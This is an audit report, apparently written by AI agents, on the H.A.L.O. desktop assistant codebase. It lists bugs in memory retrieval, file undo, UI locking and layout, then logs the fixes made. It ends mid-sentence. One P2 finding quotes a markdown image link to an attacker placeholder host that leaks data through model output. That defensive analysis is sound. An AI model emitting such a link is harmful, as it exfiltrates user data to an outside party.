# H.A.L.O. deep-scan audit — 2026-07-28

Full-repo read-only scan of the working tree on branch `token-cost-reduction`
(uncommitted changes included — 1758 insertions across 50 files are part of
what was audited).

Method: eight parallel Opus scanners over disjoint scope, plus independent
re-verification by the driver. **Nothing in the P0 section is taken on an
agent's word — each was re-confirmed against source and, where possible,
empirically.** Findings the driver could not personally re-verify are marked
`[unverified]`.

---

## 0. Coverage — read this first

The first pass had eight scanners; four completed and four were killed mid-run
by an API session limit. The four were **re-dispatched on 2026-07-28**; results
are being merged as they land.

| Area | Status |
|---|---|
| Brain runtime/transport (`server.py`, `llm.py`, `extract.py`, `secrets_store.py`) | ✅ complete |
| Brain data + agent graph (`store.py`, `memory.py`, `graph.py`, `gate.py`) | ✅ complete |
| Tools, doc ingestion, mock, Voice, contract, gate scripts | ✅ complete |
| Rust/Tauri native + build tooling | ✅ complete |
| **UI state + IPC client** (`reducer.ts`, `store.ts`, `conversations.ts`, `useHaloConnection.ts`) | ✅ complete (re-run) — **found a new P0** |
| **UI/UX, layout, sizing, a11y** (all views + CSS, via `ui-ux-pro-max`) | ✅ complete (re-run) — **3 P0s** |
| **Third-party API hallucination check** (context7) | ✅ complete (re-run) — **zero hallucinated** |
| **Docs↔code drift + ponytail ledger** | ✅ complete (re-run) — no secrets, no dead code |

**All eight areas are now audited.** The docs-drift + ponytail-ledger scan
completed on its third attempt. Headline results: **no committed secret in any
tracked file** (`git grep` clean; `.gitignore` covers `.env`/`session.json`/db/
egg-info); **no dead code or stale artifacts**; and all **68 `ponytail:` markers
classify as valid deferrals — zero already-done, zero stale, nothing to delete**
(the deliberate shortcuts are honest). Its findings are **doc corrections, not
code fixes** — five stale status claims, listed in §5b.

The context7 API check came back **clean: 104 API surfaces verified, zero
hallucinated, zero wrong** (details in §1b). The windows-rs 0.61 GDI signatures
confirmed in the first pass are included in that count.

---

## 1. Baseline — every gate is green

Run by the driver, not claimed:

- 16/16 Brain test suites pass
- `check_contract_sync.py`: 29 message schemas in sync across schema/TS/Python
- `python -m brain.ipc.contract` self-check: OK
- Voice tests: OK
- `npx tsc --noEmit`: clean
- Vitest: 32/32 across 9 files
- All 4 TS selfchecks (contract, queue, reducer, conversations): PASS
- Zero `any` in the entire TypeScript codebase

## 1b. Third-party API verification (context7) — clean

The hallucination check you specifically asked for: **104 API surfaces verified
against pinned-version docs, zero hallucinated, zero wrong, zero unverifiable.**
The highest-churn surfaces most likely to be invented all came back correct —
`AsyncSqliteSaver(conn)` positional constructor, `END` as a `path_map` key,
`recursion_limit` at config top level, `result["__interrupt__"]` / `snap.interrupts`,
the single-arg websockets handler on `asyncio.server.serve`, the
`MATCH ? AND k = ?` vec0 form, and every Job Object call. This is a genuinely
good result and worth stating plainly.

But four dependency-hygiene findings did surface (driver-verified):

- **[P1] `aiosqlite` is imported but not declared** (`graph.py:23`, absent from
  `brain/pyproject.toml`). It resolves only transitively via
  `langgraph-checkpoint-sqlite`. A clean install where that transitive edge
  changes breaks the Brain. Add it explicitly.
- **[P1] No Python dep is pinned, and six crossed a major.** `langgraph>=0.2`
  resolves to **1.2.9 today** (driver-confirmed: `StateSnapshot.interrupts`
  exists), but a clean install *could* land on 0.2.x where `.interrupts` does
  **not** exist — `rehydrate_pending()` would throw, get swallowed by the catch
  at `graph.py:708`, and every pending Tier-3 approval would silently fail to
  rehydrate after a Brain restart while the app looks healthy. Pin
  `langgraph>=1.0,<2`.
- **[P2] `mammoth.convert_to_markdown` is deprecated** (`extract.py:54`) —
  upstream says use HTML + a separate converter. The repo *already* depends on
  and uses `markdownify`, so the fix is one line and adds nothing.
- **[P3] Two dead npm deps** — `@tauri-apps/plugin-global-shortcut` and
  `@tauri-apps/plugin-window-state` in `ui/package.json`, zero JS imports
  (driver-confirmed); both features live entirely in Rust. Drop the npm
  packages, keep the crates.

(context7 had no entry for fastembed/httpx/keyring/the PDF+docx parsers/zustand/
react-virtual; those verdicts rest on installed-artifact introspection + a clean
`tsc`, and are flagged as such in the full report.)

## 1c. The central finding

**This is the central finding of the audit.** The codebase is genuinely
well-built — the P0s below are not sloppiness, they are all bugs in the exact
shape the green suite is structurally incapable of seeing. Every P0 has a
passing test sitting next to it that tests the wrong thing.

---

## 2. P0 — live, verified, causing damage now

### P0-1 Memory retrieval is silently returning nothing, on your machine, today

**Where:** `brain/brain/store.py:507-531`, plus missing de-indexing at
`store.py:390` (`set_belief_status`), `:478` (`supersede`), `:584`
(`invalidate_belief`), `:559` (`decay`).

Three defects compound:

1. `k` is consumed by the vec0 virtual table; `b.status='active'` is applied
   *after*. Dead rows crowd out the `k` budget.
2. Nothing removes a belief from `belief_vec`/`belief_map` when it is
   archived/superseded/invalidated. Verified by grep: those two tables are
   only ever deleted from in `_index_embedding` (re-index) and `purge_belief`
   (explicit "Delete permanently" click).
3. An empty vec result is `return`ed verbatim (`store.py:527`) instead of
   falling through to the recency query directly below it. The fallback runs
   only when `vec is None` or the query *raises*. Zero rows is neither.

**Driver-verified against the live DB** (`%LOCALAPPDATA%\Halo\halo.db`, read-only):

```
belief by status:      active 8 | archived 27 | superseded 3
INDEXED by status:     archived 10 | superseded 2   <-- zero active
active NOT indexed:    8   (all of them)
```

Every row in the vector index is dead, and no live belief is indexed at all.
`search_beliefs` returns `[]` for every query → `memory.retrieve` returns `[]`
→ `run_turn` builds no memory message. **Halo currently injects zero beliefs
into every prompt while 8 active beliefs sit in the table.** Nothing logs or
surfaces this.

Same call is the AUDN neighbour fetch (`memory.py:303`), so consolidation sees
no neighbours, always decides ADD, and re-creates duplicates — the exact
failure `systemdesign/03-memory.md` v2 was written to eliminate.

A fourth contributing defect: `_embed` memoizes failure process-wide
(`store.py:237,249`) and `_index_embedding` early-returns on `vec is None`
(`:265`), with no back-fill. One offline launch permanently de-indexes every
belief written during it. The comment at `store.py:247` ("next Brain start
tries again") is true of the embedder and false of the rows.

**Fix:** (a) `if rows: return [...]` so the recency query is an honest floor;
(b) one `_unindex(conn, belief_id)` helper called from the four status-change
sites; (c) lazy back-fill on `connect()` for active beliefs missing from
`belief_map`.

### P0-2 Undo of a deleted file corrupts every line ending

**Where:** `brain/brain/tools/files.py:363-377` (`_delete_inverse`) →
`:283-288` (`_file_create`).

`_file_delete` reads the prior bytes in **binary**, so a Windows text file
yields a string containing literal `\r\n`. `_file_create` restores with
`p.open("x", encoding="utf-8")` — `newline=None`, which translates every `\n`
to `os.linesep`. Each original `\r\n` is written back as `\r\r\n`.

**Driver-verified empirically:**

```
os.linesep = '\r\n'
original  = b'line1\r\nline2\r\n'
restored  = b'line1\r\r\nline2\r\r\n'
BYTE-IDENTICAL: False
```

The file "comes back" and looks fine in most editors, so the corruption is
invisible until something diffs, parses, or hashes it. This is precisely what
D7 in `mem/Decisions.md` forbids: *"a fake/best-effort undo is worse than an
honest `undoable:false`."*

**Fix:** `p.open("x", encoding="utf-8", newline="")`. One keyword.

### P0-3 `file_edit` silently rewrites the whole file's line endings, irreversibly

**Where:** `brain/brain/tools/files.py:305-322`.

`read_text` collapses `\r\n`/`\r` to `\n`; `write_text` expands `\n` to
`os.linesep`. Editing one snippet in an LF-only file on Windows (a `.sh`, a
`.py` from a Unix checkout, anything under `core.autocrlf=input`) converts
**every line in the file**. The tool's own schema promises "Replace one exact
snippet." The recorded inverse is another `file_edit` on the already-converted
file, so undo restores the snippet but never the endings — and nothing anywhere
records what they were.

**Fix:** `newline=""` on both the read and the write.

### P0-4 `dir_organize` failing mid-batch moves real files with no undo record

**Where:** `brain/brain/tools/files.py:385-410`, executed via `gate.py:302-346`.

The only guard in the move loop is `src.exists()`. Any other failure on move
*k* of up to 200 — full disk, a file locked by another process
(`PermissionError`, routine on Windows), `MAX_PATH`, a cross-device copy
failing halfway — propagates out. `_execute_tail` catches it, `inverse` stays
`None`, and `_record` writes `undoable: false`. Moves 1..k-1 already happened
and are **permanently unreversible**. A half-organized Downloads folder with no
undo is exactly the destructive-batch failure `dir_organize` exists to prevent.

**Fix:** catch per-move inside the loop and return the partial
`{"moves": done, "failed": [...]}` as a successful-with-errors result, so
`_organize_inverse` still records a reversal for what actually moved. Matches
the existing `skipped` idiom.

### P0-5 Saving or removing the OpenRouter key locks the Settings key row forever

**Where:** `ui/src/settings/SettingsView.tsx:51`, `:61` + `usePendingConfirm.ts:42-47`.
*Driver-verified against source.*

`saveKey()`/`removeKey()` call `begin("openrouter_key", "checking…")` with only
two arguments. In `usePendingConfirm`, `confirms` then defaults to `() => false`
and `operationKind` is `undefined` (so `errorKey` is `undefined` and the error
branch is dead too). **Both unlock paths are permanently falsy** — the
`settings_state` frame the Brain sends back does land and does update
`state.settings`, but nothing in the hook ever reads it.

Driver-confirmed this is the *only* two-arg `begin()` call site: every other
caller passes a predicate, e.g. MemoryView
`begin(id, "Saving…", (value) => value?.status === "superseded", "memory_edit")`.
Introduced by the refactor that moved Settings onto the shared hook without
supplying the predicate the shared hook now requires; the stale comment at
`SettingsView.tsx:44-46` still describes the old identity-based behaviour.

Unrecoverable, not merely annoying: `WorkspaceRoot.tsx:264-300` keeps all six
views mounted (`hidden=`), so `SettingsView` never remounts and its hook state
never resets. The key `<input>`, Save, and Remove all stay disabled, and the
status line renders `"checking…"` **instead of the real key status** — the exact
display failure that cost a user a paid key rotation in `mem/Bugs.md`
(2026-07-21). No test caught it: `SettingsView.test.tsx` covers the unknown-key
display, never the save→confirm→unlock path.

**Fix:** either pass a real predicate + `operationKind` here, or (lazier, more
robust for a primitive collection) make `usePendingConfirm` treat "no predicate"
as "unlock on any change to `collection[key]`", restoring the pre-refactor
behaviour. Add a dead-end escape (timeout or manual reset) — a settings key has
no snapshot to reconcile it. Note the sibling `SkillsView.tsx:50` omits
`operationKind` the same way (latent — see P2s).

### P0-6 The approval overlay covers the chat composer and blocks clicks full-width

**Where:** `ui/src/approvals/ApprovalCard.css:7-24`. *Driver-verified.*

The overlay is `position:absolute; left:0; right:0; bottom:16px` with
`pointer-events:auto` — full window width, sitting over the top ~28px of the
32px composer textarea. So while any approval is pending, the user cannot click
into the composer, and if the card is one that "waits forever" (P0-5, or the
rule-3 hangs in §3) the chat input is dead with it. Confirmed from source: the
overlay spans the full width and captures pointer events. **Fix:** make the
overlay wrapper `pointer-events:none` and re-enable it only on `.approval-card`
itself, so clicks outside the card fall through to the composer.

### P0-7 Markdown links render at 1.88:1, and light-mode UA controls leak into the dark app

**Where:** no anchor color rule in any stylesheet; no `color-scheme` declared.
*Driver-verified* (grep found zero `a {` rules and no `color-scheme` property).

Rendered assistant links fall back to the UA default `#0000EE` on the dark halo
bubble — a computed contrast of **1.88:1**, far below the WCAG AA 4.5:1 floor,
effectively invisible. The same missing `color-scheme: dark` means every native
scrollbar, `<select>` popup and checkbox renders in light chrome inside a dark
app. **Fix:** add an anchor color token used by `Markdown.tsx`'s `a` renderer,
and declare `color-scheme: dark` (or theme-aware) at the root.

### P0-8 The capsule clips its right cluster (the mic indicator) whenever narration renders

**Where:** `ui/src/orb/OrbRoot.css:31-48`.

Grid `1fr auto 1fr` + `white-space:nowrap` throughout + `.narration{max-width:160px}`
produces a content floor of ~466px inside a fixed **360px** window with
`overflow:hidden`. The first thing amputated is the right cluster — the mic
indicator — which contradicts `ui_ux/04-voice.md:17` (mic presence must remain
visible). This is a spec-drift + layout-overflow P0: the capsule cannot show
narration and mic state at the same time at its own fixed width. **Fix:** let
narration truncate with ellipsis at a width that preserves both clusters, or
size the capsule to its content. Needs a human eye on the running app to confirm
the exact clip point, but the overflow is structural, not cosmetic.

---

## 3. P1 — will break under real use

**Brain / data**

- **`checkpoints.db` grows quadratically and is never pruned.** `graph.py:82`,
  `:492`. Each super-step serializes the whole `messages` channel; nothing
  deletes checkpoints. Live: 689 checkpoints / 41 threads, worst single thread
  1.95 MB of blobs, 7.1 MB db + 4.1 MB WAL after ~2 weeks of light use. Prune
  to newest N per thread on turn completion.
- **The `action` table has no retention despite being spec'd as a rolling
  window** (`systemdesign/03-memory.md:29` vs `store.py:170`). Every tool call
  ever made is retained, including `file_create` inverses that contain the
  full text of the created file. No index on `action.ts`, and
  `recent_actions` full-scans on every connect × 2 webviews.
- **Concurrent `_embed` races the lazy embedder singleton** (`store.py:233`).
  A4 deliberately moved `_embed` outside `_OP_LOCK`, which by construction
  makes it concurrent; the unguarded `if _embedder is None` means two threads
  each build a `TextEmbedding` — two ~130 MB model loads on cold start. Needs
  a dedicated `_EMBED_LOCK` around construction only (not `_OP_LOCK`, which
  would undo A4).

**Tools**

- **`file_read` has no size check anywhere** (`files.py:86`). Pointing it at a
  multi-GB file loads it entirely. Worse, `MemoryError` is caught by the
  `except Exception` fallback which then reads the same file **again**. Tier 1
  inside roots = no approval, so the model can OOM-kill the Brain unattended.
- **`file_edit`/`file_create` are non-atomic** (`files.py:313`, `:286`).
  `write_text` truncates then streams; a crash/full disk/AV grab mid-write
  leaves the file truncated, and the recorded inverse's sha256 precondition
  then fails, so undo *refuses*. Original content simply gone. Needs
  temp-file + `os.replace`.
- **No timeout or bound on document parsing** (`gate.py:304`, `docs.py:117`).
  `_extract_pdf` has no page cap; `_extract_xlsx` caps rows but not sheets.
  `asyncio.to_thread` work is not cancellable, so a wedged parse holds a pool
  thread for the process lifetime. Fix by bounding the work (page/sheet caps),
  not by adding a timeout that can't fire.
- **`doc_digest` extracts before hashing** (`docs.py:114-127`). Two separate
  reads separated by an LLM round-trip. Save the file in between — the single
  most likely thing to happen while Halo digests your documents — and a digest
  of the *old* content is cached under the *new* content's sha256. That entry
  is a permanent hit no invalidation can reach. Hash first, then look up, then
  extract only on a miss (also skips re-parsing on hits).

**Runtime / transport**

- **`_release_deferred` reopens the interleave window it was written to close**
  (`server.py:513`). *Driver-found independently before the scanners reported.*
  The key is popped before the drain, so for the whole flush `_broadcast` sees
  `None` and live frames go straight out, overtaking held ones. Drain from the
  front and delete the key only when empty.
- **`_broadcast` de-routes a stalled client but never closes its socket**
  (`server.py:165`). The comment claims teardown is left to the handler's
  `finally`, but the handler is parked in `async for raw in ws` and only gets
  there when the socket *closes* — which nothing does. Socket, handler task
  and checkpoint state leak for the process lifetime. The overflow branch 14
  lines above does this correctly with `code=1013`.
- **`secrets.compare_digest` raises `TypeError` on a non-ASCII token, outside
  every `try`** (`server.py:452`). The contract validates `hello.token` as
  `str` only, so `"é"` passes validation and the `TypeError` escapes `_auth`
  and the handler. No auth bypass (connection drops), but it's an unhandled
  traceback triggerable by any unauthenticated local process. Compare bytes.

**Native / build**

- **Release builds will open a visible console window per sidecar**
  (`supervisor.rs:166` + `main.rs:2`). `python.exe` is console-subsystem; a
  GUI-subsystem parent allocates a new visible console per child. No
  `creation_flags` anywhere. Invisible today because *every* documented run
  path is `tauri dev` = debug build. Needs `CREATE_NO_WINDOW`.
- **A `child.kill()` failure permanently ends supervision for that sidecar**
  (`supervisor.rs:251-267`). The `return` sits outside the `match`, so the
  `Err(kill_error)` arm falls into it — the only branch in the loop that
  abandons supervision without exhausting the backoff ladder. Brain stuck in
  `"error"` with no restart short of relaunching the app.
- **The app hardcodes `python`; the verification tooling does not**
  (`supervisor.rs:167` vs `_python.ps1:19-62`). On a `py`-launcher-only
  machine `./dev.ps1 -Verify` prints PASSED while the app cannot start either
  sidecar. With no Python at all, Windows resolves `python` to the Store alias,
  so `spawn()` *succeeds* and the supervisor reports a crash loop — pointing
  the diagnosis at the wrong thing.

**Test isolation**

- **The documented `python voice/tests/test_client.py` archives your real
  beliefs.** It sets no env isolation (unlike `smoke_test.py` /
  `phase2_check.py`), calls `start()` with `mock=False`, which spawns
  `decay_loop`, which runs *immediately* against the real
  `%LOCALAPPDATA%\Halo\halo.db` and **writes**. Hidden because under
  `-Smoke` the harness sets `LOCALAPPDATA` first. `mem/Bugs.md` records this
  exact class already.

**UI state / transport** (from the re-run scanner)

- **A throwing validator runs *after* the rule-3 lock has flipped**
  (`useHaloConnection.ts:240`, root cause for all 11 senders). `parseIpcMessage(msg)`
  sits *outside* the try/catch — the exact "never do" structural landmine
  `mem/Bugs.md` (2026-07-21) wrote a rule against; that fix addressed the
  symptom and left the shape. Reachable repro: approval → Edit → `{"n": 1e999}`
  → Approve with edits. `JSON.parse` yields `Infinity`, the contract rejects it,
  the throw escapes *after* the card locked — nothing was sent, so no confirming
  frame is possible, and every button including "Stop this task" is
  `disabled={busy}`. The naive fix (move it inside the `try`) is a **second
  bug** — that catch queues the frame for reconnect flush, so an invalid frame
  would be replayed. `dispatch` needs a return value callers check *before*
  locking.
- **A throw during the `hello_ack` flush leaves a live, permanently deaf
  socket** (`useHaloConnection.ts:167`). The queue flush runs before
  `authenticatedRef.current = true`. A mid-flush throw escapes `onmessage`: the
  socket stays open (so `onclose` never arms the reconnect ladder), auth stays
  false, every inbound frame is dropped and every outbound is queued forever.
  The queue itself is safe (shifts only after a successful send). Fix: wrap the
  flush in try/catch and `ws.close()` on failure so the reconnect ladder takes
  over.

**UI/UX — layout & interaction** (from the re-run `ui-ux-pro-max` scanner)

- **Chat composer is permanently one row** — no auto-grow; `max-height:160px` is
  dead code because the textarea never grows, so `Shift+Enter` (multi-line
  input) is unusable. A chat app whose input can't show a second line.
- **An arriving approval steals focus out of the composer**, arming **Deny**
  under the user's next keystroke — a destructive action one stray key away.
  Approvals should announce via a live region without grabbing focus.
- **Status strip clips the Stop button at the app's own `minWidth:720`** —
  `.status-task-title` has a hard 320px floor and no wrap, so the primary
  "Stop" control is pushed off-strip at the minimum supported window width.
- **`.task-title` / `.skill-name` can never ellipsize** (missing `min-width:0`
  on the flex child) — long titles overflow their card headers instead of
  truncating.
- **Tier-3 destructive color used as text at 3.12:1** in light theme at three
  sites — `--tier-3-text` exists for exactly this and is used at only one.
- **The capsule leaks 5 theme tokens into its "fixed" palette**; in light theme
  the approval chip drops to 3.69:1.

---

## 4. P2 — correctness debt (abridged)

- **Live contract drift the drift-checker cannot see**: `SpendUpdateMsg`
  TypedDict (`contract.py:182`) is missing `session_tokens`/`last_turn_tokens`
  that both the spec and the TS interface have. `check_contract_sync.py`
  compares only `CONTRACT_SPEC` dicts — the TypedDicts are a *third*,
  unchecked mirror.
- **The reserved-`id`-in-payload rule is enforced nowhere.** Stated three
  times in `CLAUDE.md`, with a recorded incident, and no code checks it. Two
  lines in `_self_check` would.
- **D2 identical-call suppression contradicts Layer-1 stubbing**
  (`graph.py:178` vs `:252`). A repeat of a call from ≥2 rounds ago is refused
  with "its result is above" while that result has already been replaced by a
  stub saying "call the tool again". Both texts in the same prompt.
- **`_cap_result`'s list branch is dead** (`gate.py:264`) — no registered tool
  returns a list any more — while `dir_organize`, the one remaining unbounded
  producer, takes the byte-slice path and gets cut mid-string at 8 KB.
- **`_dirty` is never cleared after a successful consolidation**
  (`memory.py:318`), pinning every touched conversation's full message list
  and a live `broadcast` closure (holding the websocket) for the process life.
- **Pressure-triggered consolidation arms no retry** (`memory.py:346`) — the
  branch cancels the idle timer and returns, so a failed pressure pass leaves
  nothing pending.
- **`handle_skill_op` silently drops an unknown skill** (`mock.py:471`),
  permanently wedging the rule-3 lock. The uncommitted diff applied *exactly
  this fix* to the sibling `handle_memory_edit` and did not carry it over.
- **`csp: null` + un-overridden `img` renderer** (`tauri.conf.json:43`,
  `Markdown.tsx:50`): `![](https://attacker/leak?d=…)` in model output fires a
  real outbound GET with no policy to block it. `read_session` — which returns
  the Brain's auth token — is not ACL-gated and is callable from either webview.
- **Tier-1 tools now broadcast activity frames**, contradicting the tier table
  in `systemdesign/04-permissions.md:11` where "surface event" is the *defining*
  Tier-1/Tier-2 difference. The code change is deliberate (the test was updated
  with it); the doc was not. Update the doc, don't revert the code.
- **No enumeration test for `_MOCK_DISPATCH`** — the guard exists only for the
  real dispatch, while the documented "affordance hangs forever" incident
  happened on the *mock* side.
- **Contract 1.1's new memory-history surface has zero gate coverage.** The
  bump adds `memory_query`, `memory_history_state`, `belief_deleted`,
  `memory_edit{op:"purge"}`, and moves archived beliefs behind the new query —
  and `phase1_check.py` was extended only to tolerate `capabilities_state`.

**UI state / transport** (from the re-run scanner)

- **`conversations` and their `turns` grow without bound**
  (`conversations.ts:104-114`). `deleteConversation` edits only the registry;
  `state.conversations[id]` (the full `turns` array) is never dropped, so every
  thread opened this session stays resident. H.A.L.O. is always-on — this is a
  session-lifetime leak. (Every other slice is bounded: activities capped at
  10k, errors `.slice(-5)`, tasks/approvals reconciled per snapshot.) Also
  `reducer.ts:323` rebuilds `text + frame.text` per token frame — O(n²) over a
  long reply; leave it (`ponytail:`) until a profiler complains.
- **`skill_op` failures can never unlock their rule-3 lock**
  (`SkillsView.tsx:50` + `server.py:375`). Two stacked breaks: the caller passes
  no `operationKind`, and `skill_op` is absent from the server's correlation
  `fields` map so `operation_id` falls back to an envelope UUID the UI can't
  reach. Latent today (`skill_controls: false`); goes live the moment Phase 3
  flips the flag, and the symptom is "every skill button locks forever". Fix:
  add `skill_op: "skill_name"` to the map (server + mock) and pass `"skill_op"`
  at the call site.
- **The reducer's snapshot exit depends on `spend_update` being terminal**, a
  role the contract never marks (`reducer.ts:441`). If it ever fails to arrive
  at the end of a connect snapshot, the store never leaves snapshot mode and any
  live activity identical to an earlier one is silently swallowed. Both Brain
  paths send it last today, so it's fragility not a live defect — but
  `Gotchas.md` separately calls `spend_update` a global that can arrive any
  time. Two contradictory roles, one documented. Fix: an explicit
  `snapshot_complete` marker (mirrors the `memory_history_state` start/complete
  pair) or a bounded reducer fallback.
- **`openTurn` picks the *oldest* streaming placeholder**
  (`reducer.ts:166-171`, changed this tree). A placeholder that never gets a
  terminal frame becomes an absorbing state — every later turn's tokens/done/error
  patch into the stale bubble. Its obvious trigger is the P1 dispatch-throw
  above; fixing that P1 removes the known entry point.
- **The outbound queue is unbounded and replays stale control frames to a *new*
  Brain** (`useHaloConnection.ts:72`). No cap while the Brain is down (30s
  ladder). And a queued `approval_response`/`interrupt`/`task_op` names an id
  from the dead process; only `user_msg` survives a restart (checkpoint-keyed).
  Fix: cap the queue, and drop all-but-`user_msg` when reconnect lands on a
  different port.

## 5. Notable P3

Session file never deleted on shutdown (stale port+token can be handed to an
unrelated local listener); `extract.py`'s blanket `except Exception` reports
`PermissionError`/encrypted PDFs as "scanned PDF? no OCR", pointing at a remedy
that can never help; corrupt/encrypted DOCX/XLSX falls through to a raw-bytes
read that feeds decoded ZIP binary to the model as billed tokens; degraded
(parse-failure) digests are cached permanently and the test suite *certifies*
it; `digest_cache` never evicts stale-sha rows; temp dirs leaked by
`smoke_test.py`/`phase2_check.py` on every run; `_decay_task` global is
vestigial and its test asserts on whichever server started last; all native
diagnostics vanish in a release build.

UI/UX (re-run `ui-ux-pro-max` scanner): **12 P2 + 12 P3, and 12 accessibility
blockers** (full WCAG-mapped list in the scratchpad report). Two findings stand
out beyond the ranking: **the Midnight-Blue backdrop that is the app's stated
visual identity is not implemented** — `--canvas` and `--midnight` are defined
and referenced nowhere; `WorkspaceRoot.css:9` is a flat `var(--bg)`. And
`--motion-slow` is unused because view switching has no transition at all. On
a11y: the whole app has one test file, two tests, covering one of eight
surfaces; the assertions are real but **none of the 12 blockers would be
caught**, and `ApprovalCard` (`role="alertdialog"`, custom focus management, a
keyboard hold gesture) has zero a11y coverage. These need a human pass on the
running app to confirm rendered severity — the audit could only prove them from
source.

UI-state (re-run scanner): `beliefs`/`skills` are the only id-keyed slices *not*
reconciled at the snapshot boundary (`reducer.ts:263` — deliberate, but
undocumented, so add a comment lest someone "fix" it and wipe beliefs on
reconnect); `WorkspaceRoot`'s `toastedRef` set grows for the window's lifetime;
`Date.now()` in `TasksView` render (harmless, not a reducer-purity break).
**`CLAUDE.md` is stale**: it describes a `deriveOrbState` priority selector and
a `focusTarget` in `store.ts` — both were deliberately deleted (documented in
`OrbRoot.tsx:3-6`) and no longer exist. Fix the CLAUDE.md "UI event store"
paragraph.

The re-run scanner also **verified clean** (stated so silence isn't read as
unchecked): `session.json` re-read fresh on every reconnect (port never cached);
StrictMode teardown ordering; `applyFrame` genuinely pure; WS-disconnected vs
Brain-process-dead kept distinct; two-window state (no module-level mutable
state, no localStorage race); every one of the 17 outbound frame types is
projected (the 13 hitting `default` are inbound-only + `hello_ack`, correctly
ignored); no unchecked `as`/non-null on payloads; `usePendingConfirm` does not
repeat the 2026-07-13 StrictMode updater bug.

## 5b. Doc drift — 5 stale status claims (from the docs-drift scanner)

All are docs asserting "not implemented" for things that *did* ship, or naming
deleted symbols. No code change — these are one-line doc corrections. Fold into
Tranche 4.

1. `systemdesign/14-token-economics.md:3` says "not yet implemented" — **false**,
   shipped in `d19876c` (mtime-sort, escalation reset, turn budget, contract C4);
   its own lines 23 & 33 now self-contradict.
2. `systemdesign/03-memory.md:5-7` marks v2 "[v2 new] not yet built" — **false**,
   M1–M3 shipped and the schema migrated v2→v3.
3. `CLAUDE.md:112` documents `deriveOrbState` + `focusTarget` — **both deleted**
   (see `OrbRoot.tsx:175`); described elsewhere in this audit too.
4. `systemdesign/04-permissions.md:11` calls Tier-1 "run, log" (silent) — the
   code broadcasts activity for Tier-1 (`gate.py:347`). Same drift already in §4.
5. `PHASE3_READINESS_AUDIT.md:27-28` lists bugs #4/#5 as open — **both fixed**
   (`server.py:367/393` honest `mic` error; `graph.py:575` retained `_spawn`).

Substantiated (not drift): `12-task-runtime.md` really is still design-only (no
`TaskRuntime`/`task_log`/`TaskContext` in code); `techstack/` intentionally
lacks an `11` (IPC is cross-cutting) — undocumented but deliberate.

---

## 5c. What has already been implemented and verified (2026-07-28)

The Python data-integrity crown jewels are **done, in the working tree, gate-green**
(16/16 Brain suites, contract sync, voice isolation test — all pass; two of the
fixes additionally verified empirically and with a new permanent regression test).
Not committed (the tree holds an unrelated pre-existing sweep; commit is a
separate, user-gated step).

- **P0-1 memory retrieval** (`store.py`) — new `_unindex()` helper called at all
  seven points a belief leaves the live set (`set_belief_status`, `supersede`,
  `invalidate_belief`, `decay`, `add_candidate_belief` supersession,
  `restore_belief` successor, `purge_belief` dedup), plus the `if rows:`
  empty-result fallthrough in `search_beliefs`. Empirically verified: archiving
  4 of 5 leaves exactly 1 indexed row and search returns the survivor, not `[]`.
  New permanent test `check_dead_rows_do_not_starve_search` (isolated DB).
  *Legacy back-fill of already-stranded active rows deferred* — doing it inside
  `connect()` would re-embed under `_OP_LOCK` and reintroduce the A4 stall; the
  recency fallthrough already surfaces those rows immediately, so they lack only
  vector *ranking* until next re-embed. Tracked as an off-lock follow-up.
- **P0-2/P0-3 newline fidelity** (`files.py`) — `newline=""` on `_file_create`
  write and both `_file_edit` read/write. Empirically verified byte-identical
  CRLF round-trip through delete→undo.
- **P0-4 `dir_organize` partial failure** (`files.py`) — per-move `except OSError`
  collects a `failed` list and continues, so the inverse still reverses what
  actually moved.
- **API deps** (`brain/pyproject.toml`) — pinned `langgraph>=1.0,<2` (prevents a
  clean install on 0.2.x silently breaking Tier-3 rehydrate) and declared
  `aiosqlite`.
- **Test isolation** (`voice/tests/test_client.py`) — redirects `LOCALAPPDATA`
  to a temp dir before importing `brain.server`, so the documented command no
  longer archives the developer's real beliefs. Verified: still passes.

**UI fixes (second pass, `tsc` clean + Vitest 33/33):**
- **P0-5 Settings key lock** (`usePendingConfirm.ts`) — `confirms` is now
  optional; with no predicate the hook unlocks on any change to
  `collection[key]` (restores the pre-refactor behaviour the primitive
  settings-status collection needs). New test `no-predicate lock … unlocks on
  any change`.
- **P1 dispatch-throw** (`useHaloConnection.ts` + `ApprovalCard.tsx`) —
  `dispatch` now returns `boolean` and validates inside a guard instead of
  throwing; `ApprovalCard.approve` sends *before* locking and declines to lock
  on a rejected frame, with an inline edit error. Fixes the dead-modal for all
  11 senders.
- **P1 `hello_ack` flush throw** (`useHaloConnection.ts`) — flush wrapped in
  try/catch + `ws.close()` so a mid-flush throw can't leave a deaf socket.
- **P0-6 approval overlay** (`ApprovalCard.css`) — overlay is `pointer-events:
  none`, re-enabled on the card, so a pending approval no longer blocks the
  composer.
- **P0-7 link contrast / `color-scheme`** (`tokens.css`, `ChatView.css`) —
  `color-scheme` declared per theme block; `.md-body a` uses `var(--primary)`
  instead of the 1.88:1 UA default.

## 5d. Tranches 0d–4 completed (2026-07-29)

The remaining tranches were implemented across five parallel Opus agents (disjoint
file ownership) plus driver-owned cross-cutting fixes, and are **gate-green**:
brain suites all pass, `check_contract_sync` 30 schemas (now including the
TypedDicts), `phase1`/`phase2`/voice pass, `tsc` clean, Vitest 40/40, all 4 TS
selfchecks, `cargo build` + `cargo test` (9 tests). Not committed — that stays a
separate user-gated step.

**P0-8 capsule overflow** (`OrbRoot.css`) — narration truncates so both clusters
survive at the fixed 360px. **Empirically measured in the running orb** at 360×52
with a 512px narration injected *and* the mic present: `.capsule` scrollWidth ==
clientWidth (overflowX 0), narration ellipsized (512→160), and the mic indicator's
rect sits fully inside the pill (right 343 ≤ 360). The one deferred P0 is closed
against the running app, not source-reading.

**Tranche 0d (UI/UX + a11y):** composer `field-sizing:content` (restores
`Shift+Enter`, un-deadens `max-height:160px`); arriving approvals announce via a
polite live region and no longer steal focus onto Deny (`aria-modal="false"`;
`ApprovalCard.test.tsx` rewritten to assert focus stays on the composer); hold
button gains an `aria-describedby` gesture hint; status-strip + card titles get
`min-width:0` so Stop survives `minWidth:720` and titles ellipsize; `--tier-3-text`
at the three misusing sites; capsule token leaks pinned to fixed local values.

**UI/UX §5 tail (re-scanned 2026-07-29 since the original detail was lost):** the
Midnight-Blue backdrop (`--canvas`) and `--motion-slow` view transitions turned out
*not* to have been implemented despite an earlier claim — both are now live (workspace
gradient behind the glass, 300ms view-switch fade). Plus a shared `--disabled-opacity`
token replacing six divergent values, `--shadow-elevated` replacing raw shadows, seven
interactive controls that had no hover state (incl. the "Retry response" recovery
